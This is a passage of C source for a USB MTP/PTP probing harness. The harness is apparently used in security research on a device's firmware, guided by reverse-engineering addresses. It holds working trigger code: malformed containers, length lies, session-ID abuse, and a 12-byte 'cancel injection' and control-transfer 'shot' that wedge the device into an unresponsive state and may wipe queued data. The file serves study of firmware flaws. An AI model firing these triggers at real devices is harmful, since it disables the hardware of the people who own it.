    (void)send_liar(d, 0xFFFFFFFFu, "length-lie 0xFFFFFFFF");
    (void)xfer(d, "post-lie health", OC_GETSTORAGEIDS, 0, NULL, 1);
    (void)send_liar(d, 0, "length-lie 0");
    return xfer(d, "post-lie health 2", OC_GETSTORAGEIDS, 0, NULL, 1);
}

/*
 * v2-4 zombie_window: desync, then DURING the ~20s deadlock window fire
 * GetStorageIDs every 500ms x 40 (short per-op timeout so one hang cannot
 * eat the window). Any response-code change mid-window is signal.
 */
static uint16_t p_zombie_window(Dev *d)
{
    enum { N = 40, STEP_MS = 500 };
    uint16_t prev = 0xFFFF, rc;
    int save_timeout = (int)d->ptp_usb->timeout;
    int i;
    (void)desync_getobject(d, "GetObject desync (zombie window)", 1);
    d->ptp_usb->timeout = 1500;           /* map the window, don't eat it */
    for (i = 0; i < N; i++) {
        double t0 = now_ms();
        rc = xfer(d, "zombie-window ping", OC_GETSTORAGEIDS, 0, NULL, 1);
        jr("zombie_window\":{\"i\":%d,\"resp_code\":\"0x%04x\",\"ms\":%.2f}",
           i, rc, now_ms() - t0);
        if (prev != 0xFFFF && rc != prev)
            jr("ZOMBIE_WINDOW_SIGNAL\":\"resp changed 0x%04x -> 0x%04x at "
               "ping %d", prev, rc, i);
        prev = rc;
        if (now_ms() - t0 < STEP_MS)
            usleep((useconds_t)((STEP_MS - (int)(now_ms() - t0)) * 1000));
    }
    d->ptp_usb->timeout = save_timeout;
    return prev;
}

/*
 * v2-5 param_count_abuse: OpenSession with FIVE u32 params (container
 * 12+20) and GetStorageIDs with three — per-op param-count parsers may
 * mishandle the mismatch.
 */
static uint16_t p_param_count(Dev *d)
{
    (void)xfer(d, "OpenSession(5 params)", OC_OPENSESSION, 5,
               (const uint32_t[]){1, 0xAA, 0xBB, 0xCC, 0xDD}, 0);
    (void)xfer(d, "GetStorageIDs(3 params)", OC_GETSTORAGEIDS, 3,
               (const uint32_t[]){1, 2, 3}, 1);
    return xfer(d, "post-abuse health", OC_GETSTORAGEIDS, 0, NULL, 1);
}

/* ------------------------------------------------------------------ */
/* corpus v3 — the audit-directed decisive six (docs/MTP-AUDIT.md).    */
/* Static RE facts they probe: 0x02FE/02FF synthesized BELOW capmtp by */
/* the USB transport; the zombie is a designed cancel-latch ([ctx+1]=2 */
/* at 0x1e960 on word0==0x4001), unlatch at 0x1eca0 EATS one command;  */
/* CloseSession needs EXACT live txid + len 12 (clears session at      */
/* 0x1f0c8); 9-slot transfer ring with %9 wrap and no push guard;      */
/* unknown opcodes -> banded 0x1776E3/0x177EE3 with no container.      */

/*
 * v3-1 capture_02ff_container: latch the zombie (desync), fire
 * GetStorageIDs, and CAPTURE THE FULL 12-BYTE response container RAW —
 * no glue interpretation. The audit's decisive discriminator: the
 * synthesized 0x2FF with type!=3 or txid!=echo-of-command means the
 * synthesizer sits at the raw-transport layer (usbsys); type==3 with a
 * correct echo means it mirrors the engine txid.
 */
static uint16_t p_capture_02ff(Dev *d)
{
    unsigned char resp[12];
    unsigned char cmd[12];
    uint32_t tx = d->params.transaction_id;
    double t0;
    int got;

    (void)desync_getobject(d, "GetObject desync (02ff capture)", 1);
    sleep(1);                              /* let the cancel-latch settle */

    /* hand-built GetStorageIDs command so the txid we echo-check is
     * exactly what we sent */
    ((uint32_t *)cmd)[0] = 12;             /* length */
    ((uint16_t *)cmd)[2] = 1;              /* type: COMMAND */
    ((uint16_t *)cmd)[3] = OC_GETSTORAGEIDS;
    ((uint32_t *)cmd)[2] = tx;             /* trans_id */
    d->params.transaction_id++;
    if (raw_bulk_write(d, cmd, 12) != 0) {
        jr("op\":\"02ff-capture\",\"detail\":\"command write failed\"");
        return PTP_RC_GeneralError;
    }
    t0 = now_ms();
    got = raw_bulk_read(d, resp, 12, 8000);
    if (got >= 12) {
        jr("op\":\"02ff-capture\",\"len_field\":\"0x%08x\","
           "\"type\":\"0x%04x\",\"code\":\"0x%04x\",\"txid_echo\":\"0x%08x\","
           "\"sent_txid\":\"0x%08x\",\"ms\":%.2f",
           ((uint32_t *)resp)[0], ((uint16_t *)resp)[2],
           ((uint16_t *)resp)[3], ((uint32_t *)resp)[2], tx, now_ms() - t0);
        if (((uint16_t *)resp)[3] == PTP_ERROR_IO) {
            int type_ok = (((uint16_t *)resp)[2] == 3);
            int echo_ok = (((uint32_t *)resp)[2] == tx);
            jr("02ff_verdict\":\"synthesizer sits %s (type %s, txid %s)",
               (!type_ok || !echo_ok)
                   ? "at the RAW-TRANSPORT layer (usbsys)" 
                   : "mirroring the ENGINE txid",
               type_ok ? "=3 RESPONSE" : "!=3",
               echo_ok ? "=echo" : "!=echo");
        }
    } else {
        jr("op\":\"02ff-capture\",\"detail\":\"no 12-byte container "
           "captured (engine silent AND transport silent)\","
           "\"sent_txid\":\"0x%08x\",\"ms\":%.2f", tx, now_ms() - t0);
    }
    return RC_OK;
}

/*
 * v3-2 session_id_abuse: OpenSession(4) and OpenSession(0x7FFFFFFF)
 * (audit: both accepted — session id stored unvalidated in
 * [1,0xFFFFFFFE]); ops still work; then the RECOVERY CANDIDATE:
 * CloseSession with the EXACT live txid counter and len=12 — predicted
 * 0x2001 + session cleared at 0x1f0c8. We track the txid faithfully and
 * fire both interpretations of "live txid" (next-expected and last-seen).
 */
static uint16_t p_session_abuse(Dev *d)
{
    uint32_t s4 = 4, smax = 0x7FFFFFFFu;
    uint16_t rc;
    unsigned char c[12];
    unsigned char resp[12];
    int got;

    rc = xfer(d, "OpenSession(4)", OC_OPENSESSION, 1, &s4, 0);
    jr("session_abuse\":\"OpenSession(4) -> 0x%04x (audit: accepted, "
       "unvalidated)", rc);
    rc = xfer(d, "OpenSession(0x7FFFFFFF)", OC_OPENSESSION, 1, &smax, 0);
    jr("session_abuse\":\"OpenSession(0x7FFFFFFF) -> 0x%04x", rc);
    (void)xfer(d, "ops-still-work check", OC_GETSTORAGEIDS, 0, NULL, 1);

    /* CloseSession, len=12 (Nparam=0), txid = next-expected then last-seen.
     * After OpenSession the engine counter=1; our params->transaction_id
     * has advanced past every valid op — journal the exact values used. */
    {
        uint32_t t_next = d->params.transaction_id;
        uint32_t t_last = d->params.transaction_id - 1;
        double t0;
        int variant;

        for (variant = 0; variant < 2; variant++) {
            uint32_t t = variant ? t_last : t_next;
            ((uint32_t *)c)[0] = 12;
            ((uint16_t *)c)[2] = 1;
            ((uint16_t *)c)[3] = OC_CLOSESESSION;
            ((uint32_t *)c)[2] = t;
            d->params.transaction_id = t + 1;
            if (raw_bulk_write(d, c, 12) != 0) {
                jr("session_abuse\":\"CloseSession(txid=0x%x) write failed",
                   t);
                continue;
            }
            t0 = now_ms();
            got = raw_bulk_read(d, resp, 12, 5000);
            if (got >= 12) {
                jr("session_abuse\":\"CloseSession(len12,txid=0x%08x) -> "
                   "len 0x%08x type 0x%04x CODE 0x%04x echo 0x%08x, "
                   "%.2fms", t, ((uint32_t *)resp)[0],
                   ((uint16_t *)resp)[2], ((uint16_t *)resp)[3],
                   ((uint32_t *)resp)[2], now_ms() - t0);
                if (((uint16_t *)resp)[3] == RC_OK)
                    jr("session_abuse\":\"RECOVERY WORKED (0x2001, session "
                       "cleared per audit 0x1f0c8)");
            } else {
                jr("session_abuse\":\"CloseSession(len12,txid=0x%08x) -> "
                   "no container, %.2fms", t, now_ms() - t0);
            }
        }
    }
    return xfer(d, "post-abuse health", OC_GETSTORAGEIDS, 0, NULL, 1);
}

/*
 * v3-3 zombie_alternation: latch the zombie, then GetDeviceInfo x10 with
 * generous timeouts, journaling answered-vs-eaten per command. The
 * 0x1eca0 unlatch-eats-one logic predicts ~alternating no-response.
 */
static uint16_t p_zombie_alternation(Dev *d)
{
    enum { N = 10 };
    int i, answered = 0, eaten = 0;
    (void)desync_getobject(d, "GetObject desync (alternation)", 1);
    sleep(1);
    for (i = 0; i < N; i++) {
        double t0 = now_ms();
        uint16_t rc = xfer(d, "alternation GetDeviceInfo", OC_GETDEVICEINFO,
                           0, NULL, 1);
        int was_eaten = (rc == PTP_ERROR_IO);
        if (was_eaten) eaten++; else answered++;
        jr("zombie_alternation\":{\"i\":%d,\"outcome\":\"%s\","
           "\"resp_code\":\"0x%04x\",\"ms\":%.2f}",
           i, was_eaten ? "EATEN" : "answered", rc, now_ms() - t0);
    }
    jr("zombie_alternation_summary\":\"%d answered / %d eaten — %s",
       answered, eaten,
       (eaten > 0 && answered > 0) ? "ALTERNATION PRESENT (unlatch-eats-one)"
       : (eaten == N ? "all eaten" : "all answered"));
    return RC_OK;
}

/*
 * v3-4 cancel_injection — THE 2-BYTE REPRO: from a CLEAN state, send a
 * hand-built container whose word0 reads 0x4001 to the event pump
 * (length field = 0x00004001; type/code/txid zero) on the command pipe.
 * Prediction: instant zombie from clean state, no data phase needed.
 */
static uint16_t p_cancel_injection(Dev *d)
{
    unsigned char c[12];
    uint16_t health;
    double t0 = now_ms();

    memset(c, 0, sizeof(c));
    ((uint32_t *)c)[0] = 0x00004001u;      /* word0 the pump matches */
    if (raw_bulk_write(d, c, 12) != 0) {
        jr("op\":\"cancel-injection\",\"detail\":\"write failed\"");
        return PTP_RC_GeneralError;
    }
    jr("op\":\"cancel-injection\",\"detail\":\"word0=0x00004001 sent on "
       "command pipe (type/code/txid zero)\",\"ms\":%.2f", now_ms() - t0);
    /* health: if the latch took, GetStorageIDs dies */
    health = xfer(d, "post-injection health", OC_GETSTORAGEIDS, 0, NULL, 1);
    if (health != RC_OK)
        jr("cancel_injection_verdict\":\"ZOMBIE LATCHED FROM CLEAN STATE "
           "(2-byte repro confirmed, health 0x%04x)", health);
    else
        jr("cancel_injection_verdict\":\"no latch (health OK) — word0 "
           "pattern alone insufficient\"");
    return health;
}

/*
 * v3-5 ring_saturation: two abandoned GetObject data phases back-to-back
 * WITHOUT close (9-slot transfer ring, %9 wrap, no push guard at
 * 0x24038): GetObject(h=1), consume only the 12-byte data header,
 * GetObject(h=2), consume only its header, then health. Watch for a
 * permanently-in-flight op. 10s cap per op.
 */
static uint16_t p_ring_saturation(Dev *d)
{
    unsigned char hdr[12];
    int save_timeout = (int)d->ptp_usb->timeout;
    double t0;
    uint16_t health;

    d->ptp_usb->timeout = 10000;           /* the 10s cap */
    (void)desync_getobject(d, "GetObject(h=1) ring push #1", 1);
    t0 = now_ms();
    {
        int got = raw_bulk_read(d, hdr, 12, 10000);
        jr("ring_saturation\":\"push1 header read %s, %.2fms",
           got >= 12 ? "ok" : "NOTHING", now_ms() - t0);
    }
    (void)desync_getobject(d, "GetObject(h=2) ring push #2", 2);
    t0 = now_ms();
    {
        int got = raw_bulk_read(d, hdr, 12, 10000);
        jr("ring_saturation\":\"push2 header read %s, %.2fms",
           got >= 12 ? "ok" : "NOTHING", now_ms() - t0);
    }
    t0 = now_ms();
    health = xfer(d, "ring health (in-flight check)", OC_GETSTORAGEIDS, 0,
                  NULL, 1);
    jr("ring_saturation\":\"health 0x%04x, %.2fms — %s", health,
       now_ms() - t0,
       health == RC_OK ? "ring drained" :
       "OP NEVER COMPLETES (permanently in-flight — record-loss state)");
    d->ptp_usb->timeout = save_timeout;
    return health;
}

/*
 * v3-6 banded_unknowns_zombie: latch the zombie, then send
 * 0x1000 / 0x100B / 0x9801 / 0xFFFF with fresh txids. Differing canned
 * codes = the transport maps the engine's error bands (0x1776E3 vs
 * 0x177EE3); identical 0x2FF = the transport ignores them.
 */
static uint16_t p_banded_unknowns(Dev *d)
{
    static const uint16_t ops[] = { 0x1000, 0x100B, 0x9801, 0xFFFF };
    unsigned char resp[12];
    int i;

    (void)desync_getobject(d, "GetObject desync (banded unknowns)", 1);
    sleep(1);
    for (i = 0; i < 4; i++) {
        unsigned char c[12];
        uint32_t tx = d->params.transaction_id++;
        double t0 = now_ms();
        int got;
        ((uint32_t *)c)[0] = 12;
        ((uint16_t *)c)[2] = 1;
        ((uint16_t *)c)[3] = ops[i];
        ((uint32_t *)c)[2] = tx;
        if (raw_bulk_write(d, c, 12) != 0) {
            jr("banded_unknown\":{\"op\":\"0x%04x\",\"detail\":\"write "
               "failed\"", ops[i]);
            continue;
        }
        got = raw_bulk_read(d, resp, 12, 5000);
        if (got >= 12) {
            jr("banded_unknown\":{\"op\":\"0x%04x\",\"len\":\"0x%08x\","
               "\"type\":\"0x%04x\",\"code\":\"0x%04x\",\"ms\":%.2f}",
               ops[i], ((uint32_t *)resp)[0], ((uint16_t *)resp)[2],
               ((uint16_t *)resp)[3], now_ms() - t0);
        } else {
            jr("banded_unknown\":{\"op\":\"0x%04x\",\"outcome\":\"EATEN\","
               "\"ms\":%.2f}", ops[i], now_ms() - t0);
        }
    }
    jr("banded_unknowns_verdict\":\"compare codes above: differing = "
       "transport maps engine error bands; identical = transport ignores "
       "them\"");
    return RC_OK;
}

/* ------------------------------------------------------------------ */
/* corpus v4 — the SIC CANCEL control-transfer gate (finding:           */
/* neighboring-word decode inside the CANCEL gate, event pump           */
/* fcn.0001e3e8 @ capmtp vaddr 0x1e6ac-0x1e6d0, latch stlrb @0x1e978,   */
/* dual endpoint-session cancel @0x1e97c-0x1e9c4).                      */

/*
 * One libusb_control_transfer = one USB control transaction:
 *   SETUP packet : 21 64 00 00 00 00 06 00
 *                  (bmRequestType 0x21 host-to-interface class,
 *                   bRequest 0x64 SIC CANCEL, wValue 0x0000,
 *                   wIndex 0x0000, wLength 0x0006 — all LE on wire)
 *   OUT data     : 6 bytes, word0 = first LE u16 compared @0x1e6b4,
 *                  remaining 4 (txid) bytes UNCHECKED.
 * This is the CANONICAL route (byte-identical to libmtp's
 * ptp_usb_control_cancel_request, libusb1-glue.c:1854-1870) — the
 * route any real host library uses — unlike v3's cancel_injection
 * which fired the gate via a bulk container's length word.
 *
 * Single-shot decisive design (each wedge costs a console-side flow
 * restart, so the experiment is controlled WITHIN one connection):
 *   1. pre-flight health; abort unless 0x2001 (never fire on a
 *      non-clean device — the shot would prove nothing and still
 *      cost the restart).
 *   2. NEGATIVE CONTROL: data 02 40 00 00 00 00 (word0=0x4002).
 *      Passes every check the firmware makes before the word0
 *      compare (bRequest 0x64 @0x1e644, bmRequestType 0x21 @0x1e64c,
 *      wValue==0 @0x1e658, wIndex==0 @0x1e660, wLength==6 @0x1e668,
 *      6-byte data read @0x1e68c, free CAS lock @0x1e6a4) — only the
 *      word0 compare fails -> b.ne 0x1e6d0 -> silent consume, lock
 *      released, NO state change, NO cancel. Expect rc=6 (data phase
 *      ACKed below the pump) and health still 0x2001.
 *   3. THE SHOT: data 01 40 00 00 00 00 (word0=0x4001, txid bytes
 *      zero: no active transaction exists to cancel from a clean
 *      state, and the firmware never looks at these bytes anyway).
 *      If the finding holds: latch [ctx+1]=2 @0x1e978 + cancel of
 *      BOTH endpoint sessions @0x1e97c-0x1e9c4 -> zombie.
 *   4. post-shot health: != 0x2001 (live precedent: fast 0x02ff,
 *      runs/mtp-libptp-20261111T185552Z.jsonl) = HIT.
 *
 * The two control transfers differ in exactly ONE wire byte
 * (data byte 0: 0x02 vs 0x01) — that is the controlled experiment
 * for the logic-only word0 decode. No reset is issued after the
 * shot (a reset on a latched device drops the console off the bus,
 * runs/mtp-libptp-20261111T184331Z.jsonl).
 */
static int raw_control_cancel(Dev *d, const char *tag,
                              const unsigned char data6[6])
{
    int rc = libusb_control_transfer(d->ptp_usb->handle,
                                     0x21,    /* class | interface, H2D */
                                     0x64,    /* bRequest: SIC CANCEL  */
                                     0x0000,  /* wValue (must be 0)    */
                                     0x0000,  /* wIndex (must be 0; == interface 0) */
                                     (unsigned char *)data6,
                                     6,       /* wLength (must be 6)   */
                                     5000);
    jr("control_cancel\":{\"tag\":\"%s\",\"setup\":\"21 64 00 00 00 00 "
       "06 00\",\"data\":\"%02x %02x %02x %02x %02x %02x\",\"rc\":%d,"
       "\"detail\":\"%s\"",
       tag, data6[0], data6[1], data6[2], data6[3], data6[4], data6[5], rc,
       rc == 6 ? "data phase ACKed (transport delivered it to the pump)"
       : rc < 0 ? "STALL/rejected below the pump (reachability refuted "
       "at the transport layer)" : "short transfer");
    return rc;
}

static uint16_t p_cancel_control_gate(Dev *d)
{
    static const unsigned char neg[6]  = {0x02, 0x40, 0, 0, 0, 0}; /* 0x4002 */
    static const unsigned char shot[6] = {0x01, 0x40, 0, 0, 0, 0}; /* 0x4001 */
    uint16_t pre, post_neg, post;
    int rc_neg, rc_shot;

    /* 1. pre-flight: only fire from a verified-clean state */
    pre = xfer(d, "pre-flight health", OC_GETSTORAGEIDS, 0, NULL, 1);
    if (pre != RC_OK) {
        jr("cancel_control_gate_verdict\":\"ABORT — device not clean "
           "(pre-flight 0x%04x); shot NOT fired (a wedge costs a "
           "console-side flow restart)", pre);
        return pre;
    }

    /* 2. negative control: word0=0x4002 — every gate check passes,
     * the word0 compare fails -> silent consume, zero state change */
    rc_neg = raw_control_cancel(d, "negative-control word0=0x4002", neg);
    post_neg = xfer(d, "post-negative-control health", OC_GETSTORAGEIDS, 0,
                    NULL, 1);
    if (post_neg != RC_OK) {
        jr("cancel_control_gate_verdict\":\"DIFFERENT-BUG — the CANCEL "
           "control path wedged even for word0=0x4002 (health 0x%04x, "
           "rc %d); word0 discrimination NOT established; shot not "
           "fired", post_neg, rc_neg);
        return post_neg;
    }
    jr("negative_control\":\"rc %d, health 0x%04x — the gate consumed a "
       "non-0x4001 CANCEL silently (lock cycled, no state change, no "
       "cancel)", rc_neg, post_neg);

    /* 3. THE SHOT: word0=0x4001 — identical SETUP, one data byte
     * differs (0x02 -> 0x01) */
    rc_shot = raw_control_cancel(d, "SHOT word0=0x4001", shot);
    sleep(1);                       /* corpus convention: latch settle */

    /* 4. post-shot health: the oracle */
    post = xfer(d, "post-shot health", OC_GETSTORAGEIDS, 0, NULL, 1);
    if (post != RC_OK) {
        jr("cancel_control_gate_verdict\":\"HIT — zombie latched from a "
           "clean state via the CONTROL-transfer CANCEL route "
           "(negative control harmless: rc %d, health 0x%04x; shot: rc "
           "%d, health 0x%04x) — the only wire difference between the "
           "two transfers is data byte 0: 0x02 vs 0x01, so the "
           "word0==0x4001 branch (latch @0x1e978 + dual cancel "
           "@0x1e97c-0x1e9c4) is what fired",
           rc_neg, post_neg, rc_shot, post);
    } else {
        jr("cancel_control_gate_verdict\":\"MISS — word0=0x4001 via the "
           "control route left health 0x%04x (gate did not latch; "
           "rc neg %d / shot %d)", post, rc_neg, rc_shot);
    }
    return post;
}

/* ------------------------------------------------------------------ */
/* corpus v5 — the WIPE-CHAIN watch (confirmed finding: capmtp latch    */
/* raw 0x1e878 -> dual ds endpoint-session cancel raw 0x1e894-0x1e8dc   */
/* -> usbsys DsControllerOunce endpoint-cancel/wipe FUN_000a3a40 via    */
/* vtable 0xe9f30+0x58 inside state machine FUN_0002cbe0).              */
/*                                                                      */
/* v3's cancel_injection proved the LATCH from clean state (fast canned */
/* 0x2ff, runs/mtp-libptp-20261111T185552Z.jsonl); v4's                 */
/* cancel_control_gate covers the CONTROL-transfer route. NEITHER       */
/* observed whether the latch's dual endpoint-session cancel actually   */
/* reaches the usbsys wipe — the finding's own reachability note: the   */
/* IPC hop from endpoint-session cancel to state-machine arm was       */
/* "established structurally (sole call graph) but not single-stepped". */
/* The finding's wipe sequence gives two host-visible fingerprints:      */
/*   - IN side: endpoint-session struct zeroed + 0x1000-byte buffer     */
/*     memset + 64-byte endpoint context/ring slot zeroed + halt/re-arm */
/*     => a QUEUED-BUT-UNDELIVERED data phase is destroyed (zeroed     */
/*     bytes through a surviving armed TRB, truncated, or nothing);     */
/*   - OUT side: session zeroed AND the engine bails 0x177ae3 BEFORE    */
/*     posting any buffer (raw 0x24a50-0x24a6c) => command writes stop */
/*     completing (a bulk OUT completes only against a posted buffer). */
/*                                                                      */
/* Single-shot decisive design (one wedge max, all on ONE connection):  */
/*   1. pre-flight health; abort unless 0x2001 (never fire on a dirty   */
/*      device — the shot would prove nothing and still cost the        */
/*      console-side flow restart).                                     */
/*   2. QUEUE a known data phase on IN: hand-built GetStorageIDs       */
/*      command (~20-byte DATA answer, <1ms live), deliberately NOT    */
/*      read. This is also the finding's mismatch-of-state condition   */
/*      (data phase pending, host never consumes it).                   */
/*   3. THE SHOT: 12-byte container, word0=0x00004001, on the command   */
/*      pipe — byte-identical to v3's confirmed trigger.                */
/*   4. t+1s IN oracle read: intact DATA container (type=2, code=       */
/*      0x1004, txid echo) = queued data SURVIVED; zero-filled = the    */
/*      0x1000-buffer memset fingerprint; truncated/nothing = halt +    */
/*      ring wipe; type=3 0x2ff = synthesizer answered instead.         */
/*   5. OUT-liveness watch to ~+27s (past the 20s timer seen live in    */
/*      runs/mtp-libptp-20261111T184649Z.jsonl): one hand-built command */
/*      write + one IN poll per round. write->LIBUSB_ERROR_TIMEOUT      */
/*      transition = OUT starved of posted TRBs = the wipe chain fired; */
/*      IN polls catch any late engine-authored stale delivery (the     */
/*      finding's live-only observation, now controlled).               */
/*   6. verdict: HIT (wipe fingerprints) / LATCH-ONLY (zombie but no    */
/*      wipe: the IPC hop is refuted for this route) / MISS (no latch). */
static int watch_write(Dev *d, const void *buf, int len, int timeout_ms)
{
    int xfr = 0;
    int rc = libusb_bulk_transfer(d->ptp_usb->handle, d->ptp_usb->outep,
                                  (unsigned char *)buf, len, &xfr,
                                  timeout_ms);
    return (rc == LIBUSB_SUCCESS && xfr == len) ? 0 : rc;
}

static uint16_t p_cancel_wipe_watch(Dev *d)
{
    unsigned char cmd[12], shot[12], buf[64];
    uint32_t q_tx;
    uint16_t pre;
    double t_shot;
    int got, in_intact = 0, in_wiped = 0, ever_2ff = 0, stale = 0;
    int write_fail = 0, write_ok = 0, round;
    static const int N_ROUNDS = 8;

    /* 1. pre-flight: only fire from a verified-clean state */
    pre = xfer(d, "pre-flight health", OC_GETSTORAGEIDS, 0, NULL, 1);
    if (pre != RC_OK) {
        jr("cancel_wipe_watch_verdict\":\"ABORT — device not clean "
           "(pre-flight 0x%04x); shot NOT fired (a wedge costs a "
           "console-side flow restart)", pre);
        return pre;
    }

    /* 2. queue a known data phase on IN, deliberately unread */
    q_tx = d->params.transaction_id++;
    ((uint32_t *)cmd)[0] = 12;                 /* length */
    ((uint16_t *)cmd)[2] = 1;                  /* type: COMMAND */
    ((uint16_t *)cmd)[3] = OC_GETSTORAGEIDS;   /* 0x1004 */
    ((uint32_t *)cmd)[2] = q_tx;               /* trans_id */
    if (raw_bulk_write(d, cmd, 12) != 0) {
        jr("cancel_wipe_watch_verdict\":\"ABORT — queue-command write "
           "failed before the shot (pipe not clean)");
        return PTP_RC_GeneralError;
    }
    usleep(200000);      /* engine posts the DATA phase in <1ms live */
    jr("queue\":\"GetStorageIDs DATA phase queued on IN, unread\","
       "\"txid\":\"0x%08x\",\"expected\":\"type=2 code=0x1004 txid echo "
       "(~20 bytes)", q_tx);

    /* 3. THE SHOT — word0=0x4001 container on the command pipe,
     * byte-identical to v3's confirmed trigger */
    memset(shot, 0, sizeof(shot));
    ((uint32_t *)shot)[0] = 0x00004001u;
    if (raw_bulk_write(d, shot, 12) != 0) {
        jr("cancel_wipe_watch_verdict\":\"ABORT — the 0x4001 shot write "
           "itself failed (OUT already starved before firing?)");
        return PTP_RC_GeneralError;
    }
    t_shot = now_ms();
    jr("shot\":\"word0=0x00004001 sent on command pipe (type/code/txid "
       "zero), 12 bytes");
    sleep(1);            /* latch settle + async state-machine arm */

    /* 4. IN oracle: what happened to the queued data phase? */
    got = raw_bulk_read(d, buf, sizeof(buf), 5000);
    jhex("in_oracle", buf, got);
    if (got >= 12) {
        jr("in_oracle\":\"len_field\":\"0x%08x\",\"type\":\"0x%04x\","
           "\"code\":\"0x%04x\",\"txid_echo\":\"0x%08x\",\"elapsed_ms\":"
           "%.2f", ((uint32_t *)buf)[0], ((uint16_t *)buf)[2],
           ((uint16_t *)buf)[3], ((uint32_t *)buf)[2], now_ms() - t_shot);
        if (((uint16_t *)buf)[2] == 2 &&
            ((uint16_t *)buf)[3] == OC_GETSTORAGEIDS &&
            ((uint32_t *)buf)[2] == q_tx) {
            in_intact = 1;
            jr("in_oracle_verdict\":\"queued DATA phase SURVIVED the "
               "cancel — IN endpoint session not wiped (or its single "
               "armed TRB was already pre-fetched; ambiguous alone, the "
               "OUT watch below is the confound-free oracle)");
        } else if (((uint16_t *)buf)[2] == 3 &&
                   ((uint16_t *)buf)[3] == PTP_ERROR_IO) {
            ever_2ff = 1;
            jr("in_oracle_verdict\":\"canned 0x2ff RESPONSE displaced the "
               "queued data — transport synthesizer live, latch fired");
        } else {
            in_wiped = 1;
            jr("in_oracle_verdict\":\"queued data DESTROYED (zero-filled/"
               "garbage bytes) — the 0x1000-buffer memset + ring wipe "
               "fingerprint");
        }
        if (((uint16_t *)buf)[2] == 3 && ((uint32_t *)buf)[2] == q_tx) {
            stale = 1;
            jr("stale_delivery\":\"engine-authored container for the "
               "queued txid arrived %.2fms AFTER the cancel — armed-TRB "
               "survival through the wipe, now controlled", 
               now_ms() - t_shot);
        }
    } else {
        in_wiped = 1;
        jr("in_oracle_verdict\":\"NOTHING/truncated readable on IN 1s "
           "after the cancel — endpoint halted / armed TRBs wiped "
           "(queued data gone)");
    }

    /* 5. OUT-liveness watch past the 20s timer: one hand-built command
     * write + one IN poll per round. The write's own completion is the
     * TRB-starvation oracle; the IN poll catches late stale delivery
     * even when writes fail. */
    for (round = 0; round < N_ROUNDS; round++) {
        uint32_t tx = d->params.transaction_id++;
        int wrc;
        ((uint32_t *)cmd)[0] = 12;
        ((uint16_t *)cmd)[2] = 1;
        ((uint16_t *)cmd)[3] = OC_GETSTORAGEIDS;
        ((uint32_t *)cmd)[2] = tx;
        wrc = watch_write(d, cmd, 12, 3000);
        if (wrc == 0) {
            write_ok++;
            got = raw_bulk_read(d, buf, sizeof(buf), 2000);
            jhex("watch", buf, got);
            if (got >= 12) {
                if (((uint16_t *)buf)[3] == PTP_ERROR_IO) ever_2ff = 1;
                if (((uint16_t *)buf)[2] == 3 &&
                    ((uint32_t *)buf)[2] == q_tx) {
                    stale = 1;
                    jr("stale_delivery\":\"engine-authored container for "
                       "the queued txid arrived %.2fms AFTER the cancel",
                       now_ms() - t_shot);
                }
                jr("watch\":{\"round\":%d,\"elapsed_ms\":%.2f,"
                   "\"write\":\"ok\",\"read\":%d,\"type\":\"0x%04x\","
                   "\"code\":\"0x%04x\"}", round, now_ms() - t_shot, got,
                   ((uint16_t *)buf)[2], ((uint16_t *)buf)[3]);
            } else {
                jr("watch\":{\"round\":%d,\"elapsed_ms\":%.2f,"
                   "\"write\":\"ok\",\"read\":%d}", round,
                   now_ms() - t_shot, got);
            }
        } else {
            write_fail++;
            got = raw_bulk_read(d, buf, sizeof(buf), 2000); /* stale? */
            jhex("watch", buf, got);
            if (got >= 12 && ((uint16_t *)buf)[2] == 3 &&
                ((uint32_t *)buf)[2] == q_tx) {
                stale = 1;
                jr("stale_delivery\":\"engine-authored container for the "
                   "queued txid arrived %.2fms AFTER the cancel",
                   now_ms() - t_shot);
            }
            jr("watch\":{\"round\":%d,\"elapsed_ms\":%.2f,\"write\":"
               "\"FAILED rc=%d (OUT starved of posted TRBs — the wipe "
               "chain's OUT fingerprint)\",\"read\":%d}", round,
               now_ms() - t_shot, wrc, got);
        }
        if (round < N_ROUNDS - 1) sleep(3);
    }

    /* 6. verdict — every branch carries its evidence */
    if (write_fail && write_ok) {
        jr("cancel_wipe_watch_verdict\":\"HIT (A->B transition) — OUT "
           "writes completed (canned 0x2ff) then began timing out "
           "%.2fms after the 0x4001 shot: the dual endpoint-session "
           "cancel reached the usbsys wipe (FUN_000a3a40), the endpoint "
           "was halted/zeroed/re-armed, and no new TRBs get posted "
           "(engine bails 0x177ae3 before posting) — the IPC hop runs "
           "on the direct latch route too",
           now_ms() - t_shot);
    } else if (write_fail && !write_ok) {
        jr("cancel_wipe_watch_verdict\":\"HIT (immediate) — OUT already "
           "starved at the first watch round: the wipe completed within "
           "~4s of the shot; IN oracle above says what happened to the "
           "queued data");
    } else if (in_wiped) {
        jr("cancel_wipe_watch_verdict\":\"HIT (IN-side) — the queued "
           "data phase was destroyed (memset/ring-wipe fingerprint) "
           "while OUT writes still completed: the endpoint-session "
           "cancel wiped the IN session; the usbsys chain fired");
    } else if (ever_2ff) {
        jr("cancel_wipe_watch_verdict\":\"LATCH-ONLY — zombie confirmed "
           "(canned 0x2ff) but the queued IN data %s AND OUT writes "
           "completed for the full ~27s window: the dual endpoint-"
           "session cancel did NOT reach the usbsys wipe from the "
           "direct word0=0x4001 route — the finding's IPC-hop claim is "
           "refuted for this trigger (the desync route's Phase B must "
           "come from a different state-machine arm)",
           stale ? "was stale-delivered late" :
           in_intact ? "SURVIVED intact" : "was displaced");
    } else if (in_intact) {
        jr("cancel_wipe_watch_verdict\":\"MISS — no latch: the 0x4001 "
           "container was consumed as noise on this route (queued data "
           "intact, writes clean, no 0x2ff)");
    } else {
        jr("cancel_wipe_watch_verdict\":\"UNRESOLVED — see the raw "
           "in_oracle/watch journal lines above; re-run with the hex "
           "evidence before spending another wedge");
    }
    return ever_2ff ? PTP_ERROR_IO : RC_OK;
}

static void corpus_init(void)
{
    if (n_probes) return;
    reg("getobjectinfo_handle_zero", p_h0);
    reg("getobjectinfo_handle_max", p_hmax);
    reg("getobjectinfo_handle_wrap", p_hwrap);
    reg("getnumobjects_badstore", p_badstore);
    reg("getnumobjects_badformat", p_badfmt);
    reg("getobjecthandles_badassoc", p_badassoc);
    reg("getobject_partial_nodata", p_getobj_nodata);
    reg("getthumb_handle_max", p_thumb);
    reg("unknown_opcode_100b", p_unk1);
    reg("unknown_opcode_100c", p_unk2);
    reg("unknown_opcode_9801", p_unk3);
    reg("sendobject_rejectpath", p_sendobj);
    reg("session_reopen", p_reopen);
    reg("closesession_untidy", p_untidy);
